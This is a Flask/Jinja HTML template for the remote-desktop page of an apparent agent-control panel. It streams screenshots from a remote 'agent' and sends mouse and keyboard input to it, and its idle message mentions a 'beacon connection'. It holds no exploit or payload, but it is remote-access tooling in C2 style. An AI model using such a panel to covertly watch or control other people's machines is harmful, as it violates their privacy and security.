{% extends "base.html" %}

{% block content %}
<div class="container-fluid mt-5">
    <div class="d-flex justify-content-between align-items-center mb-5">
        <h2>
            <i class="fas fa-desktop me-2"></i>Remote Desktop - {{ agent.hostname }}
            <span class="badge bg-{% if agent.status == 'online' %}success{% else %}danger{% endif %}">
                {{ agent.status|capitalize }}
            </span>
        </h2>
        <div>
            <button id="rdControl" class="btn btn-danger me-2">
                <i class="fas fa-plug me-1"></i>
                <span id="rdStatusText">Connect Remote Desktop</span>
            </button>
            <a href="{{ base_url }}{{ url_for('agent_detail', agent_id=agent.id) }}" class="btn btn-outline-secondary">
                <i class="fas fa-arrow-left me-1"></i>Back to Agent
            </a>
        </div>
    </div>

    <div class="card shadow-sm">
        <div class="card-header">
            <div class="d-flex justify-content-between align-items-center">
                <span>Remote Desktop View</span>
                <span>
                    <span class="badge bg-{% if agent.rd_connected %}success{% else %}danger{% endif %} me-2" id="rd-connection-status">
                        {% if agent.rd_connected %}Connected{% else %}Disconnected{% endif %}
                    </span>
                    <span class="badge bg-dark">Agent ID: {{ agent.id|truncate(10) }}</span>
                </span>
            </div>
        </div>
        <div class="card-body p-0">
            <div id="remote-desktop" class="text-center" style="background-color: #1e1e1e; min-height: 500px; position: relative; cursor: none;">
                <div id="waiting-message" class="d-flex align-items-center justify-content-center h-100">
                    <div class="text-center text-white">
                        <i class="fas fa-desktop fa-3x mb-3"></i>
                        <h4>Remote Desktop</h4>
                        <p class="mb-0">Click "Connect Remote Desktop" to start viewing the agent's screen</p>
                    </div>
                </div>
                <img id="desktop-screenshot" class="img-fluid" style="display: none; max-width: 100%; height: auto; cursor: none;" alt="Remote Desktop Screenshot" tabindex="0">
                <div id="mouse-cursor" style="position: absolute; width: 16px; height: 16px; background-color: red; border-radius: 50%; pointer-events: none; display: none; z-index: 1000;"></div>
            </div>
        </div>
        <div class="card-footer">
            <div class="row">
                <div class="col-md-6">
                    <div class="d-flex align-items-center">
                        <span class="me-2">Quality:</span>
                        <select id="quality-select" class="form-select form-select-sm" style="width: auto;">
                            <option value="low">Low (Fast)</option>
                            <option value="medium" selected>Medium</option>
                            <option value="high">High (Slow)</option>
                        </select>
                    </div>
                </div>
                <div class="col-md-6 text-end">
                    <small class="text-muted">
                        Last update: <span id="last-update">Never</span>
                    </small>
                </div>
            </div>
        </div>
    </div>

    <div class="mt-3">
        <div class="alert alert-info">
            <i class="fas fa-info-circle me-2"></i>
            Remote Desktop status: <span id="rdStatusAlert">{% if agent.rd_connected %}Connected{% else %}Disconnected{% endif %}</span>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_js %}
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const remoteDesktop = document.getElementById('remote-desktop');
    const screenshotImg = document.getElementById('desktop-screenshot');
    const waitingMessage = document.getElementById('waiting-message');
    const mouseCursor = document.getElementById('mouse-cursor');
    const rdControl = document.getElementById('rdControl');
    const rdStatusText = document.getElementById('rdStatusText');
    const rdStatusAlert = document.getElementById('rdStatusAlert');
    const rdConnectionStatus = document.getElementById('rd-connection-status');
    const qualitySelect = document.getElementById('quality-select');
    const lastUpdate = document.getElementById('last-update');

    let socket = null;
    let isConnected = false;
    let currentQuality = 'medium';
    let isControlling = false;
    let imageRect = null;

    function updateConnectionStatus(connected) {
        isConnected = connected;
        if (connected) {
            rdConnectionStatus.textContent = 'Connected';
            rdConnectionStatus.className = 'badge bg-success me-2';
            rdStatusText.textContent = 'Disconnect Remote Desktop';
            rdControl.classList.remove('btn-danger');
            rdControl.classList.add('btn-success');
            rdStatusAlert.textContent = 'Connected';
            waitingMessage.style.display = 'none';
            screenshotImg.style.display = 'block';
            mouseCursor.style.display = 'block';
            isControlling = true;
        } else {
            rdConnectionStatus.textContent = 'Disconnected';
            rdConnectionStatus.className = 'badge bg-danger me-2';
            rdStatusText.textContent = 'Connect Remote Desktop';
            rdControl.classList.remove('btn-success');
            rdControl.classList.add('btn-danger');
            rdStatusAlert.textContent = 'Disconnected';
            waitingMessage.style.display = 'flex';
            screenshotImg.style.display = 'none';
            mouseCursor.style.display = 'none';
            screenshotImg.src = '';
            lastUpdate.textContent = 'Never';
            isControlling = false;
        }
    }

    function getImageCoordinates(clientX, clientY) {
        if (!imageRect) {
            imageRect = screenshotImg.getBoundingClientRect();
        }

        const scaleX = screenshotImg.naturalWidth / imageRect.width;
        const scaleY = screenshotImg.naturalHeight / imageRect.height;

        const x = Math.round((clientX - imageRect.left) * scaleX);
        const y = Math.round((clientY - imageRect.top) * scaleY);

        return { x, y };
    }

    function updateMouseCursor(x, y) {
        mouseCursor.style.left = (x - 8) + 'px';
        mouseCursor.style.top = (y - 8) + 'px';
    }

    function initializeSocket() {
        if (socket) {
            socket.disconnect();
            socket = null;
        }

        socket = io('/remote_desktop', {
            reconnectionAttempts: 0, // Unlimited reconnection attempts
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            autoConnect: false,
            query: {
                agent_id: '{{ agent.id }}'
            }
        });

        socket.on('connect', function() {
            console.log('[Remote Desktop] Socket connected');
            updateConnectionStatus(true);
            socket.emit('join_remote_desktop', { agent_id: '{{ agent.id }}' });
        });

        socket.on('reconnect', () => {
            console.log('[Remote Desktop] Socket reconnected');
            socket.emit('join_remote_desktop', { agent_id: '{{ agent.id }}' });
        });

        socket.on('agent_connected', function(data) {
            console.log('[Remote Desktop] Agent connected to WebSocket');
            updateConnectionStatus(true);
            // Remove waiting message when agent connects
            const waitingMsg = document.getElementById('waiting-message');
            if (waitingMsg) {
                waitingMsg.remove();
            }
        });

        socket.on('disconnect', function() {
            console.log('[Remote Desktop] Socket disconnected');
            updateConnectionStatus(false);
        });

        socket.on('connect_error', function(error) {
            console.error('[Remote Desktop] Connection error:', error);
            showAlert('Connection failed: ' + (error.message || 'Unknown error'), 'danger');
            updateConnectionStatus(false);
        });

        socket.on('screenshot_update', function(data) {
            if (data.screenshot) {
                screenshotImg.src = 'data:image/png;base64,' + data.screenshot;
                lastUpdate.textContent = new Date().toLocaleTimeString();
                // Update image rect when screenshot changes
                setTimeout(() => {
                    imageRect = screenshotImg.getBoundingClientRect();
                }, 100);
            }
        });

        socket.on('rd_status', function(data) {
            if (data.status === 'success') {
                updateConnectionStatus(data.action === 'start');
                showAlert(`Remote Desktop ${data.action}ed successfully: ${data.message || ''}`, 'success');
            } else {
                showAlert(`Remote Desktop error: ${data.message || 'Unknown error'}`, 'danger');
            }
        });

        socket.on('status', function(data) {
            console.log('[Remote Desktop] Status update:', data);
            if (data.status === 'connected') {
                updateConnectionStatus(true);
            } else if (data.status === 'disconnected') {
                updateConnectionStatus(false);
            }
        });
    }

    function showAlert(message, type = 'info') {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show mt-2`;
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        `;
        document.querySelector('.container-fluid').prepend(alertDiv);
        setTimeout(() => alertDiv.remove(), 5000);
    }

    // Mouse event handlers
    function handleMouseMove(e) {
        if (!isControlling || !socket) return;

        const coords = getImageCoordinates(e.clientX, e.clientY);
        updateMouseCursor(e.clientX, e.clientY);

        socket.emit('mouse_move', {
            agent_id: '{{ agent.id }}',
            x: coords.x,
            y: coords.y
        });
    }

    function handleMouseClick(e) {
        if (!isControlling || !socket) return;
        e.preventDefault();

        const coords = getImageCoordinates(e.clientX, e.clientY);
        const button = e.button === 2 ? 'right' : 'left';

        socket.emit('mouse_click', {
            agent_id: '{{ agent.id }}',
            x: coords.x,
            y: coords.y,
            button: button
        });
    }

    function handleMouseWheel(e) {
        if (!isControlling || !socket) return;
        e.preventDefault();

        const coords = getImageCoordinates(e.clientX, e.clientY);
        const delta = e.deltaY > 0 ? 'down' : 'up';

        socket.emit('mouse_scroll', {
            agent_id: '{{ agent.id }}',
            x: coords.x,
            y: coords.y,
            direction: delta
        });
    }

    // Keyboard event handlers
    function handleKeyDown(e) {
        if (!isControlling || !socket) return;

        // Prevent default behavior for certain keys
        if (['Tab', 'Enter', 'Backspace', 'Delete', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
            e.preventDefault();
        }

        socket.emit('keyboard_press', {
            agent_id: '{{ agent.id }}',
            key: e.key,
            keyCode: e.keyCode,
            shiftKey: e.shiftKey,
            ctrlKey: e.ctrlKey,
            altKey: e.altKey
        });
    }

    function handleKeyUp(e) {
        if (!isControlling || !socket) return;

        socket.emit('keyboard_release', {
            agent_id: '{{ agent.id }}',
            key: e.key,
            keyCode: e.keyCode
        });
    }

    // Initialize socket
    initializeSocket();

    // Quality change handler
    qualitySelect.addEventListener('change', function() {
        currentQuality = this.value;
        if (socket && isConnected) {
            socket.emit('change_quality', {
                agent_id: '{{ agent.id }}',
                quality: currentQuality
            });
        }
    });

    // Control button handler
    rdControl.addEventListener('click', function() {
        if (isConnected) {
            socket.emit('rd_control', {
                agent_id: '{{ agent.id }}',
                action: 'stop'
            });
        } else {
            // Clear display and show connection message
            screenshotImg.src = '';
            lastUpdate.textContent = 'Connecting...';

            fetch('/api/task', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    agent_id: '{{ agent.id }}',
                    task_type: 'remote_desktop',
                    task_data: {
                        action: 'start',
                        quality: currentQuality
                    }
                })
            }).then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    socket.connect();
                } else {
                    showAlert('Failed to start Remote Desktop: ' + (data.message || 'Unknown error'), 'danger');
                    lastUpdate.textContent = 'Never';
                }
            });
        }
    });

    // Add event listeners for mouse and keyboard control
    screenshotImg.addEventListener('mousemove', handleMouseMove);
    screenshotImg.addEventListener('mousedown', handleMouseClick);
    screenshotImg.addEventListener('wheel', handleMouseWheel);
    screenshotImg.addEventListener('contextmenu', (e) => e.preventDefault()); // Prevent right-click menu

    // Keyboard events
    document.addEventListener('keydown', handleKeyDown);
    document.addEventListener('keyup', handleKeyUp);

    // Focus the screenshot when connected
    screenshotImg.addEventListener('click', function() {
        if (isControlling) {
            screenshotImg.focus();
        }
    });

    if (isConnected) {
        socket.connect();
    } else {
        // Add waiting message if not connected
        const waitingDiv = document.createElement('div');
        waitingDiv.id = 'waiting-message';
        waitingDiv.style.color = '#ffff00';
        waitingDiv.style.fontFamily = 'Consolas, monospace';
        waitingDiv.textContent = 'Waiting for beacon connection...';
        document.getElementById('remote-desktop').appendChild(waitingDiv);
    }
});
</script>
{% endblock %}
